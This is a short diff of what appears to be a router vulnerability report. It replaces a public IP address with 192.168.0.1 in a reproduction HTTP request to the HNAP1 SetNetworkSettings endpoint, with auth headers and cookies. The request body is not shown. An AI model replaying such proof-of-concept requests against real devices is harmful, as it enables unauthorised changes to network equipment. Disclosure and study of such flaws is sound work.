@@ -30,7 +30,7 @@ In order to reproduce the vulnerability, the following steps can be followed:
 
 ```
 POST /HNAP1/ HTTP/1.1
-Host: 81.70.52.167:7018
+Host: 192.168.0.1:7018
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
 Accept: text/xml
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
@@ -39,9 +39,9 @@ Content-Type: text/xml
 SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkSettings"
 HNAP_AUTH: 3C5A4B9EECED160285AAE8D34D8CBA43 1649125990491
 Content-Length: 632
-Origin: http://81.70.52.167:7018
+Origin: http://192.168.0.1:7018
 Connection: close
-Referer: http://81.70.52.167:7018/Network.html
+Referer: http://192.168.0.1:7018/Network.html
 Cookie: SESSION_ID=2:1556825615:2; uid=TFKV4ftJ
 
 <?xml version="1.0" encoding="UTF-8"?>
